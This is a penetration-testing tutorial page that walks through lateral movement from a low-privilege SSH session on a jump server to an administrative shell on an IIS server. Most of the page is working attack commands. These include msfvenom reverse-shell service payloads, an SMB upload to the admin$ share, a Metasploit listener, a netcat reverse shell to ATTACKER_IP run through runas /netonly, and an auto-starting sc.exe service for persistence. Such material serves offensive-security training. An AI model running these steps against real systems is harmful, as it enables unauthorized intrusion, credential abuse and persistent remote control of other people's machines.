# Example

Suppose the following scenario where we have obtained two sets of AD credentials:&#x20;

a. Low privileges (user)

b. Administrative access (admin)&#x20;

Our goal is to obtain a shell session on an _IIS_ server with administrative privileges. There are 2 servers we will be working with:

a. Intermediary (`jmp.test.com`)

b. IIS (`iis.test.com`)

Let's assume that the Intermediary server have no data that will be interesting to us, and it simply functions as an intermediary to get to the _IIS_ server. The main goal is the _IIS_ server, which is only accessible/routable from the intermediary server due to network restrictions, firewalls, etc.

The first set of AD credential allows us to gain a remote shell session on the intermediary machine (`jmp.domain`), via SSH.&#x20;

However, the _IIS_ server does not expose a SSH service. Thus, we need to make use of the session we have on the intermediary server to move laterally to the _IIS_ server (`iis.domain`) using the obtained admin credentials, to gain a remote session with administrative privileges.&#x20;

### (1) Using `sc.exe`

{% embed url="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754599(v=ws.11)" %}

#### 1. SSH into the intermediary server (with the first set of low-privileged credentials)

```sh
$ ssh test.com\\user@jmp.test.com
```

This will provide us a command prompt:

```
C:\Users\user> whoami
user
```

#### 2. Craft the reverse shell payload (`msfvenom`) and upload it to the IIS server (with admin credentials)

We can use `msfvenom`  to craft a payload in the `exe-service` format, which allows us to encapsulate our payload inside a fully functional service executable.

{% code title="Attacker" overflow="wrap" %}
```sh
# take note of the LPORT value, it is required when we are starting the msfconsole listener
$ msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=9999 -o <service_exec_name>.exe
```
{% endcode %}

**Uploading the payload**

Now, we can upload the payload to the _IIS_ server (`smbclient`), and subsequently start a listener with `msfconsole` :

{% code title="Attacker" overflow="wrap" %}
```sh
# lets first identify the name of the admin share
$ smbclient -U admin -L '//iis.test.com' -W xxx
Sharename       Type      Comment
---------       ----      -------
 ADMIN$         Disk      Remote Admin
...

$smbclient -c "put <service_exec_name>.exe" -U admin -W xxx '//iis.test.com/admin$/' <password>
```
{% endcode %}

> Replace `service_exec_name>.exe` with the name of the executable file created with msfvenom

_Start the msfconsole listener:_

{% code title="Attacker" overflow="wrap" %}
```sh
$ msfconsole
msf6> use exploit/multi/handler
msf6 exploit(multi/handler) > set LHOST lateralmovement
msf6 exploit(multi/handler) > set LPORT 9999 
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
msf6 exploit(multi/handler) > exploit 
```
{% endcode %}

{% embed url="https://jarrettgxz-sec.gitbook.io/networking-concepts/networking-tools/miscellaneous/smbclient" %}

#### 3. Spawn a remote `/netonly` shell session on the intermediate server (as the admin)&#x20;

Start a listener on the attacker machine on eg. port **8888**

* This is the listener that provides us a remote shell session as the admin (next step)

{% code title="Attacker" %}
```sh
$ nc -lvnp 8888
```
{% endcode %}

From the remote shell session (step 1), we can spawn a new `/netonly` shell to allow us to perform network connections/requests as the admin:

{% code title="jmp.test.com (user)" overflow="wrap" %}
```sh
C:\Users\user> runas.exe /netonly /user:test.com\admin "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 8888"
```
{% endcode %}

The listener on port **8888** will receive a remote command prompt on `jmp.test.com` as the admin:

{% code title="jmp.test.com (admin)" %}
```
C:\Windows/system32> whoami
admin
```
{% endcode %}

#### 4. Start a service (`sc.exe`) on the _IIS_ server that automatically executes the uploaded reverse shell payload

Now, with a shell session as the admin, we can create a service executable that calls our uploaded `msfvenom` payload created earlier:

{% code title="jmp.test.com (admin)" overflow="wrap" %}
```powershell
# start powershell
C:\> powershell

PS> sc.exe \\iis.test.com create rvshell binPath= "%windir%\myservice.exe" start= auto
PS> sc.exe \\iis.test.com start rvshell
```
{% endcode %}

After performing the following actions, we will retrieve a reverse shell connection from the `msfconsole` session earlier anytime the _IIS_ server starts:

{% code title="iis.test.com (admin)" %}
```
C:\> whoami
admin
```
{% endcode %}

**Additional notes**

Note that it will not work if we tried to establish a reverse shell connection from the admin shell directly with `sc.exe` using the `binPath` option:

{% code title="Attacker (admin)" overflow="wrap" %}
```sh
$ sc.exe \\TARGET create <servicename> binPath= "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443" start= auto

$ sc.exe \\TARGET start <servicename>
```
{% endcode %}

This is because the service manager expects the executable that is being executed to function as a service executable (perform certain actions), which is different from standard `.exe` files, as with what we have provided. The method we have explored with `msfvenom` works as it encapsulates the payload within a valid service executable.
